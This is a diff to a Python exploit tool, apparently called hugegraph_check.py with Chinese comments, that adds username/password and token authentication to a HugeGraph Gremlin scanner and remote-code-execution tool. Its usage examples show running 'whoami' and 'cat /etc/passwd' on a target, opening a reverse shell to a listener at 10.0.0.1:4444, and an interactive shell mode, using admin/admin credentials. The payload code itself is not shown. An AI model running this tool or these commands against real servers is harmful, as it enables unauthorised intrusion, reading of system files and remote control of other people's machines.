@@ -70,7 +70,7 @@ def build_url(base: str, path: str) -> str:
     return f"{base.rstrip('/')}/{path.lstrip('/')}"
 
 
-def new_session(timeout: int = 10) -> requests.Session:
+def new_session(timeout: int = 10, username: str = '', password: str = '') -> requests.Session:
     s = requests.Session()
     s.verify = False
     s.headers.update({
@@ -78,7 +78,28 @@ def new_session(timeout: int = 10) -> requests.Session:
         'Accept': 'application/json, text/plain, */*',
     })
     s.timeout = timeout
+    if username:
+        s.auth = (username, password)
     return s
+
+
+def try_token_auth(url: str, s: requests.Session, username: str, password: str) -> bool:
+    """尝试 HugeGraph token 认证 (POST /auth/login 或 Basic Auth)"""
+    try:
+        # 方法1: JWT token 认证
+        r = s.post(build_url(url, '/api/auth/login'),
+                   json={'username': username, 'password': password},
+                   timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            token = data.get('token') or data.get('access_token') or data.get('data', {}).get('token')
+            if token:
+                s.headers['Authorization'] = f'Bearer {token}'
+                return True
+    except Exception:
+        pass
+    # 方法2: Basic Auth 已在 new_session 设置
+    return False
 
 
 # ===================== Gremlin Payload 构造 =====================
@@ -180,18 +201,26 @@ def detect_hugegraph(url: str, s: requests.Session) -> Tuple[bool, Optional[str]
     probes = [
         ('/versions', 'json', ['version', 'hugegraph']),
         ('/', 'html', ['hugegraph', 'HugeGraph']),
-        ('/gremlin', 'api', []),  # Gremlin 端点是否存在
-        ('/graphs/hugegraph', 'json', ['graph']),
+        ('/gremlin', 'api', []),
+        ('/graphs/hugegraph', 'json', ['graph', 'vertices', 'edges']),
         ('/api', 'html', ['hugegraph']),
     ]
 
     detected = False
+    requires_auth = False
+
     for path, resp_type, keywords in probes:
         try:
             r = s.get(build_url(url, path), timeout=8, allow_redirects=True)
             text = r.text
 
-            # Gremlin 端点: 返回 200 但可能是报错信息
+            # 401/403 → 服务存在但需要认证
+            if r.status_code in (401, 403):
+                requires_auth = True
+                safe_print(f"  {C.YLW}[*] {path} → HTTP {r.status_code} (需要认证){C.RST}")
+                continue
+
+            # Gremlin 端点: 返回 200 即存在
             if path == '/gremlin' and r.status_code == 200:
                 safe_print(f"  {C.GRN}[+] Gremlin 端点存在{C.RST}")
                 detected = True
@@ -207,6 +236,11 @@ def detect_hugegraph(url: str, s: requests.Session) -> Tuple[bool, Optional[str]
         except Exception:
             continue
 
+    # 所有端点返回 401 → 服务确认但未认证
+    if not detected and requires_auth:
+        safe_print(f"  {C.YLW}[*] 所有端点返回 401 — 服务存在但需要认证{C.RST}")
+        detected = True
+
     if not detected:
         safe_print(f"  {C.CYN}[-] 未识别 HugeGraph 特征 (将继续检测){C.RST}")
         return False, None, info
@@ -215,20 +249,23 @@ def detect_hugegraph(url: str, s: requests.Session) -> Tuple[bool, Optional[str]
     version = None
     try:
         r = s.get(build_url(url, '/versions'), timeout=8)
-        try:
-            data = r.json()
-            info['versions'] = data
-            for k, v in data.items():
-                if 'version' in str(k).lower() or 'hugegraph' in str(k).lower():
-                    if v:
-                        version = str(v)
-                        safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
-                        break
-        except json.JSONDecodeError:
-            m = re.search(r'"version"\s*:\s*"([^"]+)"', r.text)
-            if m:
-                version = m.group(1)
-                safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
+        if r.status_code == 200:
+            try:
+                data = r.json()
+                info['versions'] = data
+                for k, v in data.items():
+                    if 'version' in str(k).lower() or 'hugegraph' in str(k).lower():
+                        if v:
+                            version = str(v)
+                            safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
+                            break
+            except json.JSONDecodeError:
+                m = re.search(r'"version"\s*:\s*"([^"]+)"', r.text)
+                if m:
+                    version = m.group(1)
+                    safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
+        elif r.status_code == 401:
+            info['requires_auth'] = True
     except Exception:
         pass
 
@@ -682,18 +719,21 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''
 使用示例:
-  # 综合检测
+  # 综合检测 (无认证)
   python hugegraph_check.py -u http://192.168.1.100:8080
 
+  # 综合检测 (带 Basic Auth 认证)
+  python hugegraph_check.py -u http://192.168.1.100:8080 --username admin --password admin
+
   # 远程命令执行 (带回显)
-  python hugegraph_check.py -u http://target:8080 rce "whoami"
+  python hugegraph_check.py -u http://target:8080 rce "whoami" --username admin --password admin
   python hugegraph_check.py -u http://target:8080 rce "cat /etc/passwd"
 
   # 反弹 Shell
   python hugegraph_check.py -u http://target:8080 rce --reverse --lhost 10.0.0.1 --lport 4444
 
   # 交互式 Shell
-  python hugegraph_check.py -u http://target:8080 shell
+  python hugegraph_check.py -u http://target:8080 shell --username admin --password admin
 
   # 超时 / 代理
   python hugegraph_check.py -u http://target:8080 --timeout 15 --proxy http://127.0.0.1:8080
@@ -701,6 +741,8 @@ def main():
     )
     parser.add_argument('-u', '--url', required=True,
                         help='目标 URL (例: http://target:8080)')
+    parser.add_argument('--username', help='HugeGraph 用户名 (Basic Auth 或 Token Auth)')
+    parser.add_argument('--password', help='HugeGraph 密码')
     parser.add_argument('--timeout', type=int, default=10, help='超时秒数 (默认 10)')
     parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
     parser.add_argument('--proxy', help='HTTP 代理')
@@ -723,9 +765,16 @@ def main():
                 setattr(C, attr, '')
 
     url = args.url.rstrip('/')
-    s = new_session(args.timeout)
+    username = args.username or ''
+    password = args.password or ''
+
+    s = new_session(args.timeout, username, password)
     if args.proxy:
         s.proxies = {'http': args.proxy, 'https': args.proxy}
+
+    # 如果有凭据, 尝试 token auth
+    if username:
+        try_token_auth(url, s, username, password)
 
     if args.mode == 'check':
         run_all_checks(url, s)
